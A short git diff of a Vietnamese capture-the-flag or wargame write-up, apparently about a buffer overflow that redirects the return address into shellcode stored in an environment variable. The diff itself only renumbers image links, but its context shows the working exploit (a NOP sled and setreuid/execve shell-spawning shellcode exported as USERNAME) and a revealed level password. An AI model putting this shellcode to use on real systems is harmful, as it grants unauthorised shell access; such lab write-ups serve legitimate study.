@@ -129,7 +129,7 @@ _start:
 
 Cuối cùng là đặt chúng vào 1 trong 4 biến môi trường và return. Trong 4 biến thì chỉ có `USERNAME` là chưa có giá trị sẵn, vì vậy mình sẽ đặt shellcode vào biến `USERNAME`, và đè return address về địa chỉ struct ENV ảo + 0x80 (vị trí của `env.username`). Biến `PATH` là biến cuối cùng để overflow vì thế chắc chắn sẽ phải thay đổi, mình sẽ không sửa toàn bộ mà chỉ thêm vào phía sau để đảm bảo chương trình không bị ảnh hưởng. Vị trí của biến PATH là `ebp - 0x21c + 0x180 = ebp – 0x9c`. Địa chỉ của struct ENV ảo có thể là bất kì vùng nhớ nào có quyền read, mình debug gdb và lấy luôn giá trị cũ cho chắc cú.
 
-![](images/7.png)
+![](images/8.png)
 
 Exploit:
 
@@ -141,7 +141,7 @@ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/ga
 export USERNAME=`python2 -c "print '\x90' * 80 + '\x31\xd2\x31\xc0\x31\xdb\x31\xc9\x66\xbb\xb8\x04\x66\xb9\x54\x04\xb0\x46\xcd\x80\x31\xc0\x31\xc9\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\xb0\x0b\xcd\x80'"`
 ```
 
-![](images/8.png)
+![](images/9.png)
 
 password là: `s2$srAkdAq18q`
 
